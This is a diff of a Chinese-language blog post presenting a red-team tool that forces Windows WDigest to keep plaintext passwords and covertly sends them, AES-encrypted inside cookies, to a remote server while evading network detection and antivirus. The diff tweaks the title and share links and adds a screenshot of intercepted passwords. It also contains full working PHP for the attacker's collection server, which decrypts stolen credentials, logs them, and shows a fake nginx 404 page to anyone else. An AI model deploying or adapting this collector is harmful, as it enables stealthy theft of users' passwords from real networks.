@@ -8,15 +8,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     <meta name="description" content="该工具是去年内部红蓝对抗项目做的一个工具,目的是绕过NIDS\杀毒软件等安全防御策略收集内部所有公用机器登录的用户密码   修改注册表实现记录明文密码 通过Windows原生http方式将密码通过aes加密传送至远程服务器,体积小 服务端解密 加密后的密码通过cookie传输,使流量看起来正常 http 中host 为内网存在域名,流量设备看到的也是正常应用请求,不易被发现 支持1903及常见系">
 <meta property="og:type" content="article">
-<meta property="og:title" content="获取wdigest 明文密码加密传输至远程服务器">
+<meta property="og:title" content="获取wdigest明文密码加密传输至远程服务器">
 <meta property="og:url" content="http://wolvez.club/2020/05/11/wdigest/index.html">
 <meta property="og:site_name" content="wolvez&#39;s blog">
 <meta property="og:description" content="该工具是去年内部红蓝对抗项目做的一个工具,目的是绕过NIDS\杀毒软件等安全防御策略收集内部所有公用机器登录的用户密码   修改注册表实现记录明文密码 通过Windows原生http方式将密码通过aes加密传送至远程服务器,体积小 服务端解密 加密后的密码通过cookie传输,使流量看起来正常 http 中host 为内网存在域名,流量设备看到的也是正常应用请求,不易被发现 支持1903及常见系">
 <meta property="og:locale" content="default">
 <meta property="og:image" content="https://wolvez.oss-cn-hangzhou.aliyuncs.com/ed083f9c01fbd650ad030f462dc94235.png">
-<meta property="og:updated_time" content="2020-07-04T13:33:49.690Z">
+<meta property="og:image" content="https://wolvez.oss-cn-hangzhou.aliyuncs.com/28af501d3738cfdc9a6ead6881d6e167.png">
+<meta property="og:updated_time" content="2020-07-04T14:24:23.350Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="获取wdigest 明文密码加密传输至远程服务器">
+<meta name="twitter:title" content="获取wdigest明文密码加密传输至远程服务器">
 <meta name="twitter:description" content="该工具是去年内部红蓝对抗项目做的一个工具,目的是绕过NIDS\杀毒软件等安全防御策略收集内部所有公用机器登录的用户密码   修改注册表实现记录明文密码 通过Windows原生http方式将密码通过aes加密传送至远程服务器,体积小 服务端解密 加密后的密码通过cookie传输,使流量看起来正常 http 中host 为内网存在域名,流量设备看到的也是正常应用请求,不易被发现 支持1903及常见系">
 <meta name="twitter:image" content="https://wolvez.oss-cn-hangzhou.aliyuncs.com/ed083f9c01fbd650ad030f462dc94235.png">
     
@@ -38,7 +39,7 @@
         
     
     <!-- title -->
-    <title>获取wdigest 明文密码加密传输至远程服务器</title>
+    <title>获取wdigest明文密码加密传输至远程服务器</title>
     <!-- styles -->
     <link rel="stylesheet" href="/css/style.css">
     <!-- rss -->
@@ -85,15 +86,15 @@
     <div id="share" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2020/05/11/wdigest/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2020/05/11/wdigest/&text=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2020/05/11/wdigest/&is_video=false&description=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=获取wdigest 明文密码加密传输至远程服务器&body=Check out this article: http://wolvez.club/2020/05/11/wdigest/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2020/05/11/wdigest/&name=获取wdigest 明文密码加密传输至远程服务器&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2020/05/11/wdigest/&text=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2020/05/11/wdigest/&is_video=false&description=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=获取wdigest明文密码加密传输至远程服务器&body=Check out this article: http://wolvez.club/2020/05/11/wdigest/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2020/05/11/wdigest/&name=获取wdigest明文密码加密传输至远程服务器&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -110,7 +111,7 @@
   <header>
     
     <h1 class="posttitle" itemprop="name headline">
-        获取wdigest 明文密码加密传输至远程服务器
+        获取wdigest明文密码加密传输至远程服务器
     </h1>
 
 
@@ -153,10 +154,15 @@
 </ul>
 <p><strong>仅用作安全研究,请勿非法用途</strong></p>
 <ul>
-<li>流量信息:<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/ed083f9c01fbd650ad030f462dc94235.png" alt="2020-05-12-13-18-24"></li>
+<li><p>流量信息:<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/ed083f9c01fbd650ad030f462dc94235.png" alt="2020-05-12-13-18-24"></p>
+</li>
+<li><p>截获密码:<br><img src="https://wolvez.oss-cn-hangzhou.aliyuncs.com/28af501d3738cfdc9a6ead6881d6e167.png" alt="2020-05-12-13-17-35"></p>
+</li>
 </ul>
 <p>服务端接受解密代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AesWithOpenssl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $key; <span class="comment">// 秘钥</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $iv; <span class="comment">// 偏移量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">self</span>::$key = <span class="string">'ooo00iiiIIIlllii'</span>;</span><br><span class="line">        <span class="keyword">self</span>::$iv  = <span class="string">'zzzzZZZZTTTTLLLL'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">encryptWithOpenssl</span><span class="params">($data = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(openssl_encrypt($data, <span class="string">"AES-128-CBC"</span>, <span class="keyword">self</span>::$key, OPENSSL_RAW_DATA, <span class="keyword">self</span>::$iv));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptWithOpenssl</span><span class="params">($data = <span class="string">''</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> openssl_decrypt(base64_decode($data), <span class="string">"AES-128-CBC"</span>, <span class="keyword">self</span>::$key, OPENSSL_RAW_DATA, <span class="keyword">self</span>::$iv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$str="admin888";</span></span><br><span class="line">$obj = <span class="keyword">new</span> AesWithOpenssl();</span><br><span class="line">$token=$_COOKIE[<span class="string">'Token'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($token))</span><br><span class="line">&#123;</span><br><span class="line">   <span class="comment">// echo $token;</span></span><br><span class="line">$decrypt_token=$obj-&gt;decryptWithOpenssl($token);</span><br><span class="line"><span class="comment">//echo $decrypt_token.PHP_EOL;</span></span><br><span class="line">file_put_contents(<span class="string">'./loger/webinfo.log'</span>,$decrypt_token,FILE_APPEND); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Good!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">header(<span class="string">"HTTP/1.0 404 Not Found"</span>);</span><br><span class="line"><span class="keyword">echo</span></span><br><span class="line"><span class="string">'&lt;html&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
   </div>
 </article>
 
@@ -188,15 +194,15 @@
     <div id="share-footer" style="display: none">
       <ul>
   <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2020/05/11/wdigest/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2020/05/11/wdigest/&text=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2020/05/11/wdigest/&is_video=false&description=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=获取wdigest 明文密码加密传输至远程服务器&body=Check out this article: http://wolvez.club/2020/05/11/wdigest/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest 明文密码加密传输至远程服务器"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2020/05/11/wdigest/&name=获取wdigest 明文密码加密传输至远程服务器&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2020/05/11/wdigest/&text=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2020/05/11/wdigest/&is_video=false&description=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=获取wdigest明文密码加密传输至远程服务器&body=Check out this article: http://wolvez.club/2020/05/11/wdigest/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2020/05/11/wdigest/&title=获取wdigest明文密码加密传输至远程服务器"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2020/05/11/wdigest/&name=获取wdigest明文密码加密传输至远程服务器&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
